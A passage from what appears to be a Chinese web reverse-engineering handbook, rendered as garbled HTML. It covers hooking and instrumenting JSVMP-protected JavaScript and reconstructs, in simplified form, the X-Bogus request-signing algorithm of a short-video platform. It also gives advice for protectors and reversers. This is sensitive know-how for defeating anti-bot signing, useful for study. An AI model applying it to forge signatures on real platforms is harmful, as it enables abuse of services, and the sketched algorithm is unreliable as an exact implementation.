<span class="w">    </span><span class="nx">executionTrace</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span><span class="w"> </span><span class="nx">pc</span><span class="p">,</span><span class="w"> </span><span class="nx">opcode</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="5-apply-æ–¹æ³•è¿½è¸ª">5. Apply æ–¹æ³•è¿½è¸ª</h4>

      <p>é’ˆå¯¹ä½¿ç”¨ apply çš„å¾ªç¯ä»£ç è¿›è¡Œåˆ†æï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook Function.prototype.apply</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalApply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">apply</span><span class="p">;</span>
<span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">apply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è®°å½• apply è°ƒç”¨</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Apply called:&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Function:&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">&quot;anonymous&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  This:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Args:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è°ƒç”¨åŸå§‹æ–¹æ³•</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalApply</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Result:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// åœ¨æ—¥å¿—ä¸­åˆ†æç®—æ³•é€»è¾‘ï¼Œé¿å…å¤§é‡åŠ¨æ€è°ƒè¯•</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹åˆ†æ">å®æˆ˜æ¡ˆä¾‹åˆ†æ</h2>

      <h3 id="æ¡ˆä¾‹æŸéŸ³-x-bogus-å‚æ•°åˆ†æ">æ¡ˆä¾‹ï¼šæŸéŸ³ X-Bogus å‚æ•°åˆ†æ</h3>

      <p>æŸçŸ­è§†é¢‘å¹³å°ä½¿ç”¨ JSVMP ä¿æŠ¤å…¶ X-Bogus å‚æ•°ç”Ÿæˆç®—æ³•ï¼Œä»¥ä¸‹æ˜¯é€†å‘åˆ†æçš„æ­¥éª¤ï¼š</p>

      <h4 id="æ­¥éª¤-1å®šä½-jsvmp-è§£é‡Šå™¨">æ­¥éª¤ 1ï¼šå®šä½ JSVMP è§£é‡Šå™¨</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æœç´¢ç‰¹å¾ä»£ç </span>
<span class="c1">// 1. æŸ¥æ‰¾ WebAssembly å®ä¾‹åŒ–ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">wasmMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/WebAssembly\.instantiate/</span><span class="p">);</span>

<span class="c1">// 2. æŸ¥æ‰¾å¤§é‡çš„ switch-case ç»“æ„ï¼ˆDispatcher ç‰¹å¾ï¼‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">switchMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/switch\s*\(\s*\w+\s*\)\s*\{/g</span><span class="p">);</span>

<span class="c1">// 3. æŸ¥æ‰¾å­—èŠ‚ç æ•°ç»„ï¼ˆé€šå¸¸æ˜¯å¤§å‹ Uint8Arrayï¼‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">bytecodeMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/new\s+Uint8Array\(\[[\d,\s]+\]\)/</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="æ­¥éª¤-2æ’æ¡©åˆ†æ">æ­¥éª¤ 2ï¼šæ’æ¡©åˆ†æ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Dispatcher ä¸­æ’å…¥æ—¥å¿—</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">dispatcher</span><span class="p">(</span><span class="nx">opcode</span><span class="p">,</span><span class="w"> </span><span class="nx">operand</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Opcode: 0x</span><span class="si">${</span><span class="nx">opcode</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">)</span><span class="si">}</span><span class="sb">, Operand: </span><span class="si">${</span><span class="nx">operand</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="nx">opcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mh">0x01</span><span class="o">:</span><span class="w"> </span><span class="c1">// LOAD</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Action: LOAD from&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">operand</span><span class="p">);</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mh">0x02</span><span class="o">:</span><span class="w"> </span><span class="c1">// STORE</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Action: STORE to&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">operand</span><span class="p">);</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mh">0x10</span><span class="o">:</span><span class="w"> </span><span class="c1">// ADD</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;  Action: ADD&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// ... æ›´å¤šæŒ‡ä»¤</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="æ­¥éª¤-3ç®—æ³•è¿˜åŸ">æ­¥éª¤ 3ï¼šç®—æ³•è¿˜åŸ</h4>

      <p>åŸºäºæ—¥å¿—åˆ†æï¼Œè¿˜åŸæ ¸å¿ƒç®—æ³•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä» JSVMP å­—èŠ‚ç æ‰§è¡Œæ—¥å¿—ä¸­è¿˜åŸçš„ç®—æ³•</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateXBogus</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ­¥éª¤ 1: å‚æ•°åºåˆ—åŒ–</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">serialized</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">serializeParams</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ­¥éª¤ 2: MD5 å“ˆå¸Œ</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">serialized</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ­¥éª¤ 3: æ—¶é—´æˆ³å¤„ç†</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ­¥éª¤ 4: æ··åˆç¼–ç </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">mixed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">mixEncode</span><span class="p">(</span><span class="nx">hash</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ­¥éª¤ 5: Base64 å˜ç§ç¼–ç </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">customBase64</span><span class="p">(</span><span class="nx">mixed</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">encoded</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// è¾…åŠ©å‡½æ•°å®ç°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">serializeParams</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
<span class="w">        </span><span class="p">.</span><span class="nx">sort</span><span class="p">()</span>
<span class="w">        </span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb">=</span><span class="si">${</span><span class="nx">params</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
<span class="w">        </span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">mixEncode</span><span class="p">(</span><span class="nx">hash</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">hash</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">hash</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="å¯¹äºå¼€å‘è€…å®æ–½ä¿æŠ¤">å¯¹äºå¼€å‘è€…ï¼ˆå®æ–½ä¿æŠ¤ï¼‰</h3>

      <ol>
        <li>
          <p><strong>åˆç†é€‰æ‹©ä¿æŠ¤èŒƒå›´</strong></p>

          <ul>
            <li>ä»…å¯¹æ ¸å¿ƒç®—æ³•å’Œæ•æ„Ÿé€»è¾‘ä½¿ç”¨ JSVMP</li>
            <li>é¿å…ä¿æŠ¤æ•´ä¸ªåº”ç”¨ï¼Œå½±å“æ€§èƒ½å’Œè°ƒè¯•</li>
            <li>è€ƒè™‘ä¿æŠ¤ç²’åº¦ä¸æ€§èƒ½çš„å¹³è¡¡</li>
          </ul>
        </li>
        <li>
          <p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p>

          <ul>
            <li>ä½¿ç”¨ WebAssembly å®ç°è§£é‡Šå™¨ä»¥æå‡æ€§èƒ½</li>
            <li>å¯¹çƒ­ç‚¹ä»£ç è·¯å¾„è¿›è¡Œä¼˜åŒ–</li>
            <li>å®ç°æŒ‡ä»¤ç¼“å­˜æœºåˆ¶</li>
          </ul>
        </li>
        <li>
          <p><strong>å¤šå±‚é˜²æŠ¤</strong></p>

          <ul>
            <li>JSVMP ç»“åˆä»£ç æ··æ·†</li>
            <li>æ·»åŠ åè°ƒè¯•å’Œç¯å¢ƒæ£€æµ‹</li>
            <li>å®æ–½å®Œæ•´æ€§æ ¡éªŒ</li>
          </ul>
        </li>
      </ol>

      <h3 id="å¯¹äºé€†å‘åˆ†æè€…">å¯¹äºé€†å‘åˆ†æè€…</h3>

      <ol>
        <li>
          <p><strong>é€‰æ‹©åˆé€‚çš„é€†å‘æ–¹æ³•</strong></p>

          <ul>
            <li>ç®€å•åœºæ™¯ä½¿ç”¨ RPC è°ƒç”¨</li>
            <li>å¤æ‚åœºæ™¯è€ƒè™‘ç®—æ³•è¿˜åŸ</li>
            <li>æ ¹æ®å…·ä½“éœ€æ±‚æƒè¡¡æˆæœ¬å’Œæ”¶ç›Š</li>
          </ul>
        </li>
        <li>
          <p><strong>å·¥å…·åŒ–åˆ†ææµç¨‹</strong></p>

          <ul>
            <li>å¼€å‘è‡ªåŠ¨åŒ–æ’æ¡©å·¥å…·</li>
            <li>å»ºç«‹ JSVMP ç‰¹å¾åº“</li>
            <li>ç§¯ç´¯å¸¸è§æŒ‡ä»¤é›†æ¨¡å¼</li>
          </ul>
        </li>
        <li>
          <p><strong>å›¢é˜Ÿåä½œ</strong></p>

          <ul>
            <li>åˆ†äº« JSVMP è§£é‡Šå™¨ç‰¹å¾</li>
            <li>å…±äº«é€†å‘å·¥å…·å’Œè„šæœ¬</li>
            <li>å»ºç«‹æ¡ˆä¾‹çŸ¥è¯†åº“</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-jsvmp-ä¼šæ˜¾è‘—å½±å“ç½‘é¡µæ€§èƒ½å—">Q: JSVMP ä¼šæ˜¾è‘—å½±å“ç½‘é¡µæ€§èƒ½å—ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¼šæœ‰ä¸€å®šå½±å“ã€‚JSVMP å°†åŸç”Ÿ JavaScript æ‰§è¡Œè½¬æ¢ä¸ºè™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œï¼Œä¼šå¸¦æ¥æ€§èƒ½å¼€é”€ã€‚æ ¹æ®å®ç°æ–¹å¼ä¸åŒï¼Œæ€§èƒ½æŸå¤±é€šå¸¸åœ¨ 2-10 å€ä¹‹é—´ã€‚ä½¿ç”¨ WebAssembly
        å®ç°çš„è§£é‡Šå™¨æ€§èƒ½æŸå¤±è¾ƒå°ï¼ˆ2-3 å€ï¼‰ï¼Œçº¯ JavaScript å®ç°å¯èƒ½è¾¾åˆ° 5-10 å€ã€‚å› æ­¤å»ºè®®ä»…å¯¹æ ¸å¿ƒç®—æ³•ä½¿ç”¨ JSVMPï¼Œè€Œéæ•´ä¸ªåº”ç”¨ã€‚</p>

      <h3 id="q-jsvmp-ä¿æŠ¤æ˜¯å¦ç»å¯¹å®‰å…¨">Q: JSVMP ä¿æŠ¤æ˜¯å¦ç»å¯¹å®‰å…¨ï¼Ÿ</h3>

      <p><strong>A</strong>: æ²¡æœ‰ç»å¯¹å®‰å…¨çš„ä¿æŠ¤ã€‚JSVMP å¤§å¹…å¢åŠ äº†é€†å‘åˆ†æçš„éš¾åº¦å’Œæˆæœ¬ï¼Œä½†ä»ç„¶å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p>

      <ul>
        <li>RPC è¿œç¨‹è°ƒç”¨ï¼ˆé»‘ç›’ä½¿ç”¨ï¼‰</li>
        <li>æ·±åº¦æ’æ¡©åˆ†æè¿˜åŸç®—æ³•</li>
        <li>å†…å­˜åˆ†æå’ŒåŠ¨æ€è°ƒè¯•</li>
        <li>æœºå™¨å­¦ä¹ è¾…åŠ©çš„æ¨¡å¼è¯†åˆ«</li>
      </ul>

      <p>JSVMP çš„ç›®æ ‡æ˜¯æé«˜æ”»å‡»æˆæœ¬ï¼Œè€Œéå®Œå…¨é˜²æ­¢é€†å‘ã€‚</p>

      <h3 id="q-å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦ä½¿ç”¨äº†-jsvmp">Q: å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦ä½¿ç”¨äº† JSVMPï¼Ÿ</h3>

      <p><strong>A</strong>: å¯ä»¥é€šè¿‡ä»¥ä¸‹ç‰¹å¾è¯†åˆ«ï¼š</p>

      <ul>
        <li>å­˜åœ¨å¤§é‡ switch-case ç»“æ„ï¼ˆDispatcherï¼‰</li>
        <li>åŒ…å« WebAssembly æ¨¡å—å®ä¾‹åŒ–</li>
        <li>å­˜åœ¨å¤§å‹çš„å­—èŠ‚ç æ•°ç»„ï¼ˆUint8Arrayï¼‰</li>
        <li>å‡½æ•°è°ƒç”¨è¢«æ›¿æ¢ä¸ºè™šæ‹Ÿæœºæ‰§è¡Œè°ƒç”¨</li>
        <li>ä»£ç ä¸­å­˜åœ¨æ˜æ˜¾çš„è™šæ‹Ÿå¯„å­˜å™¨å’Œè™šæ‹Ÿæ ˆæ“ä½œ</li>
      </ul>

      <h3 id="q-jsvmp-ä¸ä»£ç æ··æ·†çš„åŒºåˆ«">Q: JSVMP ä¸ä»£ç æ··æ·†çš„åŒºåˆ«ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¸»è¦åŒºåˆ«ï¼š</p>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>ä»£ç æ··æ·†</th>
            <th>JSVMP</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>åŸç†</td>
            <td>é‡å‘½åã€æ§åˆ¶æµå¹³å¦åŒ–ç­‰</td>
            <td>ä»£ç è™šæ‹ŸåŒ–</td>
          </tr>
          <tr>
            <td>å¯è¯»æ€§</td>
            <td>é™ä½ä½†ä»å¯ç†è§£</td>
            <td>å®Œå…¨å¤±å»è¯­æ³•å±æ€§</td>
          </tr>
          <tr>
            <td>æ‰§è¡Œæ–¹å¼</td>
            <td>ç›´æ¥æ‰§è¡Œ</td>
            <td>è™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œ</td>
          </tr>
          <tr>
            <td>æ€§èƒ½å½±å“</td>
            <td>è¾ƒå°ï¼ˆ0-50%ï¼‰</td>
            <td>è¾ƒå¤§ï¼ˆ2-10å€ï¼‰</td>
          </tr>
          <tr>
            <td>é€†å‘éš¾åº¦</td>
            <td>ä¸­</td>
            <td>é«˜</td>
          </tr>
          <tr>
            <td>å¯è¿˜åŸæ€§</td>
            <td>AST å¯éƒ¨åˆ†è¿˜åŸ</td>
            <td>éš¾ä»¥å®Œå…¨è¿˜åŸ</td>
          </tr>
        </tbody>
      </table>

      <h3 id="q-å­¦ä¹ -jsvmp-é€†å‘éœ€è¦å“ªäº›åŸºç¡€">Q: å­¦ä¹  JSVMP é€†å‘éœ€è¦å“ªäº›åŸºç¡€ï¼Ÿ</h3>

      <p><strong>A</strong>: å»ºè®®æŒæ¡ä»¥ä¸‹çŸ¥è¯†ï¼š</p>

      <ul>
        <li>JavaScript è¯­è¨€æ·±å…¥ç†è§£ï¼ˆä½œç”¨åŸŸã€é—­åŒ…ã€åŸå‹é“¾ç­‰ï¼‰</li>
        <li>ç¼–è¯‘åŸç†åŸºç¡€ï¼ˆè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€ASTï¼‰</li>
        <li>è™šæ‹ŸæœºåŸç†ï¼ˆæŒ‡ä»¤é›†ã€è§£é‡Šå™¨ã€å­—èŠ‚ç ï¼‰</li>
        <li>WebAssembly åŸºç¡€</li>
        <li>é€†å‘å·¥ç¨‹æ€ç»´å’Œæ–¹æ³•</li>
        <li>ç†Ÿç»ƒä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å­¦æœ¯è®ºæ–‡">å­¦æœ¯è®ºæ–‡</h3>

      <ul>
        <li>åŒ¡å‡¯å…ƒ. ã€ŠåŸºäº WebAssembly çš„ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ³•ç ”ç©¶ä¸å®ç°ã€‹. è¥¿åŒ—å¤§å­¦ç¡•å£«è®ºæ–‡, 2018</li>
        <li>Stephen Fewer. ã€ŠVirtual Machine Based Obfuscationã€‹. 2006</li>
      </ul>

      <h3 id="æŠ€æœ¯åšå®¢">æŠ€æœ¯åšå®¢</h3>

      <ul>
        <li><a href="https://blog.jsvmp.com/jsjiamihejsvmpyuanlifenx/">æ·±å…¥äº†è§£ JS åŠ å¯†æŠ€æœ¯åŠ JSVMP ä¿æŠ¤åŸç†åˆ†æ</a></li>
        <li><a href="https://blog.jsvmp.com/jsxunihua/">JS è™šæ‹ŸåŒ–ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤åŸç†åˆ†æ</a></li>
        <li><a href="https://blog.csdn.net/Awesome_py/article/details/136652368">JSVMP åˆ†æ - CSDN</a></li>
        <li><a href="https://blog.csdn.net/liu_yueyang/article/details/149280146">JavaScript VMP åˆ†æä¸è°ƒè¯•</a></li>
        <li><a href="https://blog.csdn.net/weixin_43114209/article/details/150575091">VMPï¼ˆè™šæ‹Ÿæœºä¿æŠ¤ï¼‰åŸç†ã€å·¥ç¨‹è½åœ°ã€æ€§èƒ½æƒè¡¡ä¸ç©å…·å®ç°</a>
        </li>
      </ul>

      <h3 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h3>

      <ul>
        <li><a href="https://www.cnblogs.com/ikdl/p/16807224.html">æŸéŸ³ X-Bogus é€†å‘åˆ†æï¼ŒJSVMP çº¯ç®—æ³•è¿˜åŸ</a></li>
        <li><a href="https://blog.csdn.net/jerry3747/article/details/130889462">JSVMP é€†å‘å®æˆ˜ x-sã€x-t ç®—æ³•è¿˜åŸ</a></li>
        <li><a href="https://www.resourch.com/archives/95.html">JSVMP ç¼–è¯‘ä¸åç¼–è¯‘è¯¦è§£</a></li>
        <li><a href="https://blog.csdn.net/qq_59848320/article/details/132722222">JSVMP é€†å‘ï¼ˆè¡¥ç¯å¢ƒç¯‡ï¼‰</a></li>
      </ul>

      <h3 id="å¼€æºé¡¹ç›®">å¼€æºé¡¹ç›®</h3>

      <ul>
        <li><a href="https://github.com/patriksimek/vm2">vm2</a> - Node.js æ²™ç®±è™šæ‹Ÿæœº</li>
        <li><a href="https://github.com/gf3/sandbox">js-sandbox</a> - JavaScript æ²™ç®±</li>
        <li><a href="https://emscripten.org/">Emscripten</a> - C/C++ åˆ° WebAssembly ç¼–è¯‘å™¨</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-webassembly-reversing">WebAssembly é€†å‘</a> - WebAssembly æŠ€æœ¯åŸºç¡€</li>
        <li><a href="../02-Techniques/js_deobfuscation.md">JavaScript åæ··æ·†</a> - ä»£ç åæ··æ·†æŠ€æœ¯</li>
        <li><a href="#02-Tooling-ast-tools">AST è§£æå’Œæ“ä½œ</a> - AST å·¥å…·ä½¿ç”¨</li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">æµè§ˆå™¨è°ƒè¯•æŠ€å·§</a> - é«˜çº§è°ƒè¯•æ–¹æ³•</li>
        <li><a href="#04-Advanced-Recipes-frontend-hardening">å‰ç«¯åŠ å›ºæŠ€æœ¯</a> - å…¶ä»–å‰ç«¯ä¿æŠ¤æŠ€æœ¯</li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-webassembly-reversing">
      <h2>36. WebAssembly Reversing</h2>
      <h1 id="webassembly-é€†å‘">WebAssembly é€†å‘</h1>

      <h2 id="æ€è€ƒæ—¶åˆ»">ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>

      <p>åœ¨æ·±å…¥ WebAssembly é€†å‘ä¹‹å‰ï¼Œå…ˆæŒ‘æˆ˜ä¸€ä¸‹ä½ çš„è®¤çŸ¥ï¼š</p>

      <ol>
        <li><strong>ä¸ºä»€ä¹ˆ JavaScript è¿˜ä¸å¤Ÿå¿«ï¼Ÿ</strong> ä»€ä¹ˆåœºæ™¯ä¸‹éœ€è¦ç”¨åˆ° WebAssemblyï¼Ÿ</li>
        <li><strong>ç¼–è¯‘åçš„ä»£ç å°±å®‰å…¨äº†å—ï¼Ÿ</strong> äºŒè¿›åˆ¶æ ¼å¼çœŸçš„æ¯” JavaScript æ›´éš¾é€†å‘å—ï¼Ÿ</li>
        <li><strong>ä½ èƒ½åç¼–è¯‘ .exe æ–‡ä»¶å—ï¼Ÿ</strong> WebAssembly å’Œä¼ ç»Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</li>
        <li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸè§†é¢‘ç½‘ç«™æŠŠè§£å¯†ç®—æ³•ç¼–è¯‘æˆäº† WebAssemblyï¼ŒåŠ å¯†å‚æ•°ç»è¿‡ Wasm å¤„ç†åå‘é€ç»™æœåŠ¡å™¨ã€‚ä½ ä¼šå¦‚ä½•ä¸‹æ‰‹åˆ†æï¼Ÿ</li>
      </ol>

      <p>WebAssembly å¹¶ä¸æ˜¯é€†å‘çš„ç»ˆç‚¹ï¼Œè€Œæ˜¯æ–°çš„èµ·ç‚¹ã€‚</p>

      <hr />

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>WebAssembly (Wasm) æ˜¯ä¸€ç§ä½çº§å­—èŠ‚ç æ ¼å¼ï¼Œæ—¨åœ¨åœ¨ Web æµè§ˆå™¨ä¸­ä»¥æ¥è¿‘åŸç”Ÿçš„æ€§èƒ½è¿è¡Œä»£ç ã€‚è¶Šæ¥è¶Šå¤šçš„ Web åº”ç”¨ä½¿ç”¨ WebAssembly æ¥ä¿æŠ¤æ ¸å¿ƒç®—æ³•å’Œæå‡æ€§èƒ½ï¼Œè¿™ä¹Ÿç»™é€†å‘å·¥ç¨‹å¸¦æ¥äº†æ–°çš„æŒ‘æˆ˜ã€‚
      </p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

      <p><strong>WebAssembly (Wasm)</strong> æ˜¯ä¸€ç§é¢å‘å †æ ˆçš„è™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ã€‚å®ƒè¢«è®¾è®¡ä¸º C/C++/Rust ç­‰é«˜çº§è¯­è¨€çš„å¯ç§»æ¤ç¼–è¯‘ç›®æ ‡ï¼Œèƒ½å¤Ÿåœ¨ Web ä¸Šä»¥æ¥è¿‘åŸç”Ÿæ€§èƒ½è¿è¡Œã€‚</p>

      <p><strong>å…³é”®ç‰¹ç‚¹</strong>:</p>

      <ul>
        <li>äºŒè¿›åˆ¶æ ¼å¼ï¼Œä½“ç§¯å°ï¼ŒåŠ è½½å¿«</li>
        <li>åŸºäºå †æ ˆçš„è™šæ‹Ÿæœº</li>
        <li>å¼ºç±»å‹ç³»ç»Ÿ</li>
